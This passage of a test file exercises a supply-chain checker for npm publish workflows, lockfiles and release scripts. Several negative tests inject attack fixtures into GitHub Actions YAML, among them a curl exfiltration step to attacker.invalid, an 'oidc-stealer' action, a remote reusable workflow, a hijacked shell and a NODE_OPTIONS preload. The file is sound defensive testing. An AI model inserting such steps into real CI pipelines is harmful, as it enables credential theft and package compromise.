        "pnpm typecheck && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json --unexpected && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must execute node dist/cli.js validate --json",
    );
  });

  it("fails when release:check validates dist before test builds it", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && node dist/cli.js validate --json && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must invoke pnpm test before node dist/cli.js validate --json",
    );
  });

  it("fails when release:check reintroduces a duplicate build", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test && pnpm build && pnpm check:docs && pnpm check:supply-chain && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when release:check reintroduces a duplicate build via pnpm run", async () => {
    const violations = checkCiPackageScripts(
      packageWithScript(
        "release:check",
        "pnpm typecheck && pnpm test && pnpm run build && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      ),
    );
    expect(violations).toContain(
      "package.json: scripts.release:check must not run a duplicate pnpm build",
    );
  });

  it("fails when full integration stops building dist first", async () => {
    root = await buildTree({
      packageContent: packageWithScript(
        "test:integration:full",
        "vitest run --config vitest.integration.config.ts",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when ci-deep.yml omits Node 24 smoke", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "  node-24-smoke:",
        "  node-24-smoke-removed:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when ci-deep.yml is not workflow_dispatch-only", async () => {
    root = await buildTree({
      ciDeepContent: wellFormedCiDeep.replace(
        "on:\n  workflow_dispatch:",
        "on:\n  pull_request:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when POSIX signal cancellation coverage is missing", async () => {
    const brokenCoverage = wellFormedVerifyTimeoutAbort
      .replace('if (process.platform !== "win32") {', "")
      .replace('it.each(["SIGINT", "SIGTERM"] as const)', "it(");

    const violations = checkCancellationCoverage(brokenCoverage);
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: POSIX CLI signal cancellation must be explicitly POSIX-gated",
    );
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: POSIX SIGINT/SIGTERM cancellation cases are missing",
    );

    root = await buildTree({ verifyTimeoutAbortContent: brokenCoverage });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when Windows bounded-command cancellation coverage is missing", async () => {
    const brokenCoverage = wellFormedVerifyTimeoutAbort
      .replace(
        'describe.runIf(process.platform === "win32")("Windows bounded-command cancellation contract"',
        'describe.skip("Windows bounded-command cancellation contract"',
      )
      .replaceAll(
        'termination: { strategy: "taskkill" },',
        "termination: undefined,",
      );

    const violations = checkCancellationCoverage(brokenCoverage);
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: Windows bounded-command cancellation coverage is missing",
    );
    expect(violations).toContain(
      "verify-timeout-abort.test.ts: Windows coverage must assert taskkill cleanup",
    );

    root = await buildTree({ verifyTimeoutAbortContent: brokenCoverage });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when pnpm is below the reviewed security release", async () => {
    root = await buildTree({
      packageContent: wellFormedPackage.replace("pnpm@10.34.2", "pnpm@10.33.2"),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when Vite is below the reviewed version", async () => {
    root = await buildTree({
      packageContent: wellFormedPackage.replace("^8.1.4", "^8.1.3"),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the lockfile Vite specifier differs from the reviewed range", async () => {
    root = await buildTree({
      lockContent: wellFormedLock.replace(
        "        specifier: ^8.1.4",
        "        specifier: ^8.1.3",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the lockfile Vite resolution differs from the reviewed version", async () => {
    root = await buildTree({
      lockContent: wellFormedLock.replace(
        "        version: 8.1.4",
        "        version: 8.1.3",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when the lockfile contains multiple Vite package versions", async () => {
    root = await buildTree({
      lockContent: wellFormedLock.replace(
        "  vite@8.1.4: {}\nsnapshots:",
        "  vite@8.1.4: {}\n  vite@8.1.3: {}\nsnapshots:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when esbuild lifecycle scripts are not explicitly denied", async () => {
    root = await buildTree({
      workspaceContent: wellFormedWorkspace.replace(
        "  esbuild: false",
        "  esbuild: true",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish.yml has a tag-pinned action", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
        "actions/checkout@v6.0.2",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when NPM_TOKEN is in publish.yml", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish + "\n# NPM_TOKEN reference",
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has checkout", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
        "      - name: Checkout\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has pnpm install", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Install\n        run: pnpm install --frozen-lockfile\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has release:check", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Release check\n        run: pnpm release:check\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when prepare job has id-token: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read",
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when verify job has id-token: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  verify:\n    runs-on: ubuntu-latest\n    needs: [publish, prepare]\n    permissions:\n      contents: read",
        "  verify:\n    runs-on: ubuntu-latest\n    needs: [publish, prepare]\n    permissions:\n      contents: read\n      id-token: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has id-token: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  github-release:\n    name: Create verified GitHub Release\n    runs-on: ubuntu-latest\n    needs: [verify, prepare, publish]\n    permissions:\n      contents: write",
        "  github-release:\n    name: Create verified GitHub Release\n    runs-on: ubuntu-latest\n    needs: [verify, prepare, publish]\n    permissions:\n      contents: write\n      id-token: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has checkout", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Download integrity artifact",
        "      - name: Checkout\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Download integrity artifact",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has repository script", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Create or reconcile GitHub Release",
        "      - name: Run script\n        run: node scripts/release-notes.mjs\n      - name: Create or reconcile GitHub Release",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow_dispatch trigger is added", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "on:\n  push:\n    tags:\n      - 'v*'",
        "on:\n  push:\n    tags:\n      - 'v*'\n  workflow_dispatch:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when branch trigger is added", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "on:\n  push:\n    tags:\n      - 'v*'",
        "on:\n  push:\n    tags:\n      - 'v*'\n    branches:\n      - main",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when a publish workflow job timeout is missing", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "    timeout-minutes: 15\n    steps:",
        "    steps:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when release artifact retention is missing", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          name: release-artifact\n          path: release-artifact/\n          retention-days: 7",
        "          name: release-artifact\n          path: release-artifact/",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when integrity artifact retention is missing", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          name: release-integrity\n          path: release-integrity.json\n          retention-days: 7",
        "          name: release-integrity\n          path: release-integrity.json",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job does not use --ignore-scripts", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        'npm publish "./$tarball" --ignore-scripts',
        'npm publish "./$tarball"',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // --- New negative tests for enhanced checker ---

  it("fails when publish job has an arbitrary SHA-pinned action", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Malicious\n        uses: attacker/oidc-stealer@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has a local action", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Local action\n        uses: ./local-action\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has a curl step", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish",
        "      - name: Exfiltrate\n        run: curl -fsS https://attacker.invalid/steal\n      - name: Verify manifest and publish",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has an extra run step", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Create or reconcile GitHub Release",
        "      - name: Extra\n        run: echo hacked\n      - name: Create or reconcile GitHub Release",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when prepare job has issues: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read",
        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      issues: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has packages: write", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    permissions:\n      contents: read\n      id-token: write\n    outputs:\n      published_now: ${{ steps.publish.outputs.published_now }}",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    permissions:\n      contents: read\n      id-token: write\n    outputs:\n      published_now: ${{ steps.publish.outputs.published_now }}\n      packages: write",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when job-level reusable workflow uses @main", async () => {
    root = await buildTree({
      publishContent:
        wellFormedPublish +
        "\n  call:\n    uses: attacker/repo/.github/workflows/pwn.yml@main\n",
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when verify job has no checkout", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Checkout release tag\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          fetch-depth: 1\n          persist-credentials: false\n      - name: Download release artifact",
        "      - name: Download release artifact",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when checker is called twice and second call is clean (state isolation)", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
        "actions/checkout@v6.0.2",
      ),
    });
    const { failures: firstFailures } = checkSupplyChainInvariants(root);
    expect(firstFailures).toBeGreaterThan(0);
    await cleanup();

    root = await buildTree();
    const { failures: secondFailures } = checkSupplyChainInvariants(root);
    expect(secondFailures).toBe(0);
    await cleanup();
  });

  // --- Canonical structure violation tests ---

  it("fails when publish job has job-level NODE_OPTIONS env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    env:\n      NODE_OPTIONS: --require ./release-artifact/preload.cjs",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish step has custom shell", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Verify manifest and publish\n        id: publish\n        env:",
        "      - name: Verify manifest and publish\n        id: publish\n        shell: \"bash -c 'echo PWNED >&2; bash {0}'\"\n        env:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job has container", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    container: attacker/image:latest",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when publish job runs-on self-hosted", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on: ubuntu-latest",
        "  publish:\n    name: Publish to npm via Trusted Publishing\n    runs-on:\n      - self-hosted\n      - attacker",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when EXPECTED_TAG is replaced with fixed string", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "EXPECTED_TAG: ${{ github.ref_name }}",
        "EXPECTED_TAG: v9.9.9",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when EXPECTED_COMMIT is replaced with fixed string", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "EXPECTED_COMMIT: ${{ github.sha }}",
        "EXPECTED_COMMIT: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when download-artifact uses pattern: *", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Set up Node",
        '      - name: Download release artifact\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          pattern: "*"\n          merge-multiple: true\n          path: release-artifact\n      - name: Set up Node',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when setup-node package-manager-cache is changed", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "package-manager-cache: false",
        "package-manager-cache: true",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release job has GH_HOST env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          TAG: ${{ github.ref_name }}\n          PUBLISHED_NOW: ${{ needs.publish.outputs.published_now }}",
        "          TAG: ${{ github.ref_name }}\n          PUBLISHED_NOW: ${{ needs.publish.outputs.published_now }}\n          GH_HOST: github.enterprise.invalid",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when github-release step has custom shell", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "      - name: Create or reconcile GitHub Release\n        env:",
        "      - name: Create or reconcile GitHub Release\n        shell: python\n        env:",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // --- Workflow envelope violation tests ---

  it("fails when workflow has top-level NODE_OPTIONS env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        "permissions: {}\n\nenv:\n  NODE_OPTIONS: --require ./release-artifact/preload.cjs\n",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow has top-level NPM_CONFIG_REGISTRY env", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        "permissions: {}\n\nenv:\n  NPM_CONFIG_REGISTRY: https://attacker.invalid\n",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow has top-level defaults.run.shell", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        'permissions: {}\n\ndefaults:\n  run:\n    shell: bash -c "echo PWNED >&2; bash {0}"\n',
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow has top-level defaults.run.working-directory", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "permissions: {}\n",
        "permissions: {}\n\ndefaults:\n  run:\n    working-directory: release-artifact\n",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when workflow concurrency group is changed", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "  group: npm-publish-${{ github.ref }}\n  cancel-in-progress: false",
        "  group: shared-release-group\n  cancel-in-progress: true",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  // --- OIDC setup-node invariant tests ---

  it("fails when setup-node re-adds registry-url", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          node-version: 24\n          package-manager-cache: false",
        "          node-version: 24\n          registry-url: https://registry.npmjs.org",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });

  it("fails when setup-node removes package-manager-cache", async () => {
    root = await buildTree({
      publishContent: wellFormedPublish.replace(
        "          node-version: 24\n          package-manager-cache: false",
        "          node-version: 24",
      ),
    });
    const { failures } = checkSupplyChainInvariants(root);
    expect(failures).toBeGreaterThan(0);
    await cleanup();
  });
});
